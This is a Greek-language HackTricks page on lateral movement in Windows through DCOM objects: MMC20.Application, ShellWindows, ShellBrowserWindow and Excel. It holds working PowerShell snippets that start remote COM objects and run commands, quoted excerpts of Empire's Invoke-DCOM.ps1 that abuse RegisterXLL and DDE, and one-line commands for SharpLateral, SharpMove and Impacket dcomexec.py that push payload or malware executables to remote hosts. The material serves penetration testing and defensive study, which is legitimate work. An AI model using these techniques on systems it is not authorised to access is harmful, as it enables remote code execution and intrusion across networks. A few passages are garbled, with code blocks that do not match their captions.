# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δείτε την αρχική ανάρτηση από [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Τα αντικείμενα του Distributed Component Object Model (DCOM) προσφέρουν μια ενδιαφέρουσα δυνατότητα για αλληλεπιδράσεις με αντικείμενα μέσω δικτύου. Η Microsoft παρέχει εκτενή τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Μια λίστα εφαρμογών DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Το αντικείμενο COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει την scripting των λειτουργιών snap-in του MMC. Σημαντικά, αυτό το αντικείμενο περιέχει μια μέθοδο `ExecuteShellCommand` κάτω από `Document.ActiveView`. Περισσότερες πληροφορίες σχετικά με αυτή τη μέθοδο μπορούν να βρεθούν [εδώ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ελέγξτε την εκτέλεση της:

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω ενός δικτύου μέσω μιας εφαρμογής DCOM. Για να αλληλεπιδράσετε με το DCOM απομακρυσμένα ως διαχειριστής, μπορεί να χρησιμοποιηθεί το PowerShell ως εξής:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Αυτή η εντολή συνδέεται με την εφαρμογή DCOM και επιστρέφει μια παρουσία του αντικειμένου COM. Η μέθοδος ExecuteShellCommand μπορεί στη συνέχεια να κληθεί για να εκτελέσει μια διαδικασία στον απομακρυσμένο υπολογιστή. Η διαδικασία περιλαμβάνει τα εξής βήματα:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Αποκτήστε RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε την αρχική ανάρτηση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Το **MMC20.Application** αντικείμενο αναγνωρίστηκε ότι λείπει από ρητές "LaunchPermissions," προεπιλέγοντας άδειες που επιτρέπουν την πρόσβαση στους Διαχειριστές. Για περισσότερες λεπτομέρειες, μπορεί να εξερευνηθεί ένα νήμα [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET για φιλτράρισμα αντικειμένων χωρίς ρητή Άδεια Εκκίνησης.

Δύο συγκεκριμένα αντικείμενα, `ShellBrowserWindow` και `ShellWindows`, επισημάνθηκαν λόγω της έλλειψης ρητών Αδειών Εκκίνησης. Η απουσία μιας καταχώρισης `LaunchPermission` στο μητρώο κάτω από `HKCR:\AppID\{guid}` σημαίνει ότι δεν υπάρχουν ρητές άδειες.

### ShellWindows

Για το `ShellWindows`, το οποίο λείπει από ένα ProgID, οι μέθοδοι .NET `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν την εγκατάσταση του αντικειμένου χρησιμοποιώντας το AppID του. Αυτή η διαδικασία εκμεταλλεύεται το OleView .NET για να ανακτήσει το CLSID για το `ShellWindows`. Μόλις εγκατασταθεί, είναι δυνατή η αλληλεπίδραση μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε κλήσεις μεθόδων όπως `Document.Application.ShellExecute`.

Παραδείγματα εντολών PowerShell παρέχονται για την εγκατάσταση του αντικειμένου και την εκτέλεση εντολών απομακρυσμένα:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)

# Need to upload the file to execute
$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
```
### Lateral Movement with Excel DCOM Objects

Η πλευρική κίνηση μπορεί να επιτευχθεί εκμεταλλευόμενη τα αντικείμενα DCOM Excel. Για λεπτομερείς πληροφορίες, είναι σκόπιμο να διαβάσετε τη συζήτηση σχετικά με την εκμετάλλευση του Excel DDE για πλευρική κίνηση μέσω DCOM στο [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Το έργο Empire παρέχει ένα σενάριο PowerShell, το οποίο δείχνει τη χρήση του Excel για απομακρυσμένη εκτέλεση κώδικα (RCE) μέσω της χειραγώγησης αντικειμένων DCOM. Παρακάτω παρατίθενται αποσπάσματα από το σενάριο που είναι διαθέσιμο στο [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), που παρουσιάζουν διάφορες μεθόδους για την κακή χρήση του Excel για RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automation Tools for Lateral Movement

Δύο εργαλεία επισημαίνονται για την αυτοματοποίηση αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα σενάριο PowerShell που παρέχεται από το έργο Empire και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένες μηχανές. Αυτό το σενάριο είναι προσβάσιμο στο αποθετήριο GitHub του Empire.

- **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την εκτέλεση κώδικα απομακρυσμένα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αυτόματα Εργαλεία

- Το σενάριο Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη εκτέλεση όλων των σχολιασμένων τρόπων για την εκτέλεση κώδικα σε άλλες μηχανές.
- Μπορείτε να χρησιμοποιήσετε το `dcomexec.py` της Impacket για να εκτελέσετε εντολές σε απομακρυσμένα συστήματα χρησιμοποιώντας DCOM.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
```
- Μπορείτε επίσης να χρησιμοποιήσετε [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Μπορείτε επίσης να χρησιμοποιήσετε [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αναφορές

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
